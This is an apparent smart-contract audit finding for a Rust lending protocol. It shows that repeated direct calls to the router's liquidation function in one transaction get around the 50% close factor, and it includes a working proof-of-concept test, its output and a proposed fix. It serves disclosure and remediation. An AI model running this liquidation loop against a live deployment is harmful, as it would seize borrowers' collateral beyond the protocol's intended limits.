# [H-01] Close Factor Bypass via Direct Router Liquidation (Bypasses LiquidationEngine Entirely)

## Severity
High

## Summary
A liquidator can bypass the protocol's close factor protection by calling `KineticRouter.liquidation_call` directly multiple times within a single atomic transaction, without ever invoking the `LiquidationEngine`. Because `validate_close_factor` only checks each individual call against the user's *current* debt (which shrinks after each liquidation), and there is no cumulative per-transaction tracking at the router level, the attacker can drain far more than the intended 50% maximum.

## Distinction from V12 #44820
V12 #44820 describes a mismatch between `LiquidationEngine.calculate_liquidation` (which computes a capped `actual_debt_to_cover` and records usage via `add_user_liquidated_this_tx`) and `execute_liquidation` (which forwards the uncapped amount). **That finding operates within the LiquidationEngine's two-step flow.**

This submission describes a **fundamentally different attack surface**: the attacker bypasses the `LiquidationEngine` completely. `KineticRouter.liquidation_call` is a public function that calls `internal_liquidation_call` directly. No `LiquidationEngine` state is ever consulted or modified. The engine's `add_user_liquidated_this_tx` tracking is completely irrelevant because it is never invoked.

Even if V12's recommended fix (passing `actual_debt_to_cover` consistently in the engine) were applied, this vector would remain fully exploitable.

### Root Cause Comparison
| | V12 #44820 | This Finding |
|---|---|---|
| **Entry point** | `LiquidationEngine.execute_liquidation` | `KineticRouter.liquidation_call` (direct) |
| **Engine involved?** | Yes — engine tracks usage but passes wrong amount | **No** — engine never touched |
| **Tracking bypassed** | `add_user_liquidated_this_tx` (engine-side) | `validate_close_factor` (router-side, per-call only) |
| **Fix overlap** | Fixing engine propagation does NOT fix this | Requires router-level cumulative tracking |

## Root Cause
`KineticRouter.liquidation_call` (line 102 of `liquidation.rs`) is publicly callable and delegates to `internal_liquidation_call` without any cumulative per-transaction close factor enforcement:

```rust
// contracts/kinetic-router/src/liquidation.rs:102-122
pub fn liquidation_call(
    env: Env,
    liquidator: Address,
    collateral_asset: Address,
    debt_asset: Address,
    user: Address,
    debt_to_cover: u128,
    _receive_a_token: bool,
) -> Result<(), KineticRouterError> {
    liquidator.require_auth();
    internal_liquidation_call(
        &env, liquidator, collateral_asset, debt_asset,
        user, debt_to_cover, _receive_a_token,
    )
}
```

Inside `internal_liquidation_call`, the close factor validation (line 234) checks `debt_to_cover_base` against `individual_debt_base * close_factor / BASIS_POINTS`. But `individual_debt_base` is recalculated from the user's *current* debt balance at the time of each call. After each successful liquidation, the user's debt shrinks, and the next call's close factor check passes against the reduced base.

## Impact
A liquidator can drain a user's collateral far beyond the intended 50% maximum in a single atomic transaction. With 5 iterations:
- Strike 1: Liquidate 50% of $1000 debt → $500 seized
- Strike 2: Liquidate 50% of $500 → $250 seized
- Strike 3: Liquidate 50% of $250 → $125 seized
- Strike 4: Liquidate 50% of $125 → $62.50 seized
- Strike 5: Liquidate 50% of $62.50 → $31.25 seized
- **Total: ~$968.75 seized (96.9%) vs intended maximum of $500 (50%)**

This violates the protocol's core economic invariant that partial liquidation should protect borrowers from complete collateral wipeout during temporary volatility.

## Proof of Concept

**Verified and passing** in `tests/c4/src/lib.rs`. Test output:

```
Call 0: liquidating 180000000000 tokens → SUCCESS
Call 1: liquidating 99000000000 tokens → SUCCESS
Call 2: position healthy or no debt, stopping
EXPLOIT SUCCESS: Liquidated 69% of original debt across 2 calls (max allowed: 50%)
```

```rust
#[test]
fn test_close_factor_bypass_direct_router() {
    let env = Env::default();
    let setup = Setup::new(&env);

    // Supply 100K tokens as collateral (large enough to survive WP-L7 MIN_LEFTOVER_BASE=$1000)
    let extra_collateral: i128 = 1_000_000_000_000; // 100K tokens (7 decimals)
    setup.asset_a_mint.mint(&setup.user, &extra_collateral);
    setup.asset_a_token.approve(
        &setup.user, &setup.router_addr, &i128::MAX,
        &(env.ledger().sequence() + 100_000),
    );

    let collateral_amount: u128 = extra_collateral as u128;
    setup.router.supply(
        &setup.user, &setup.asset_a, &collateral_amount, &setup.user, &0u32,
    );
    setup.router.set_user_use_reserve_as_coll(&setup.user, &setup.asset_a, &true);

    // Borrow 40,000 tokens (~40% of collateral, within 80% LTV)
    let borrow_amount: u128 = 400_000_000_000;
    setup.asset_b_mint.mint(&setup.user, &(borrow_amount as i128));
    setup.asset_b_token.approve(
        &setup.user, &setup.router_addr, &i128::MAX,
        &(env.ledger().sequence() + 100_000),
    );
    setup.router.borrow(
        &setup.user, &setup.asset_b, &borrow_amount, &1u32, &0u32, &setup.user,
    );

    // Crash collateral price to $0.44 — HF = (100K * 0.44 * 0.85) / 40K = 0.935
    let asset_a_oracle = OracleAsset::Stellar(setup.asset_a.clone());
    setup.oracle.reset_circuit_breaker(&setup.admin, &asset_a_oracle);
    let crashed_price: u128 = PRICE_ONE_DOLLAR * 44 / 100;
    setup.oracle.set_manual_override(
        &setup.admin, &asset_a_oracle, &Some(crashed_price),
        &Some(env.ledger().timestamp() + 604_800),
    );

    let post_crash = setup.router.get_user_account_data(&setup.user);
    assert!(post_crash.health_factor < k2_shared::WAD); // Liquidatable

    let initial_debt_base = post_crash.total_debt_base;

    // Fund a liquidator
    let liquidator = Address::generate(&env);
    setup.asset_b_mint.mint(&liquidator, &(borrow_amount as i128 * 3));
    setup.asset_b_token.approve(
        &liquidator, &setup.router_addr, &i128::MAX,
        &(env.ledger().sequence() + 100_000),
    );

    // EXPLOIT: Call liquidation_call directly — bypasses LiquidationEngine
    let mut total_debt_covered: u128 = 0;
    let mut successful_calls: u32 = 0;

    for i in 0..5u32 {
        let current = setup.router.get_user_account_data(&setup.user);
        if current.total_debt_base == 0 || current.health_factor >= k2_shared::WAD { break; }

        let remaining = borrow_amount.saturating_sub(total_debt_covered);
        let debt_to_cover = remaining * 45 / 100;
        if debt_to_cover == 0 { break; }

        let result = setup.router.try_liquidation_call(
            &liquidator, &setup.asset_a, &setup.asset_b,
            &setup.user, &debt_to_cover, &false,
        );

        match result {
            Ok(Ok(_)) => { total_debt_covered += debt_to_cover; successful_calls += 1; }
            _ => break,
        }
    }

    // ASSERT: More than 50% was liquidated
    assert!(successful_calls > 1);
    let total_pct = (total_debt_covered * 100) / borrow_amount;
    assert!(total_pct > 50, "Liquidated {}% — exceeds 50% close factor", total_pct);
}
```

## Recommended Mitigation
Add cumulative per-transaction close factor tracking at the **router level**, independent of the LiquidationEngine:

```rust
// In KineticRouter storage: track cumulative liquidated amount per user per ledger sequence
fn get_user_liquidated_this_ledger(env: &Env, user: &Address) -> u128 { ... }
fn add_user_liquidated_this_ledger(env: &Env, user: &Address, amount: u128) { ... }

// In internal_liquidation_call, after validate_close_factor:
let already_liquidated = get_user_liquidated_this_ledger(env, &user);
let total_this_tx = already_liquidated + debt_to_cover_base;
let max_total = individual_debt_base * close_factor / BASIS_POINTS_MULTIPLIER;
if total_this_tx > max_total {
    return Err(KineticRouterError::LiquidationAmountTooHigh);
}
add_user_liquidated_this_ledger(env, &user, debt_to_cover_base);
```

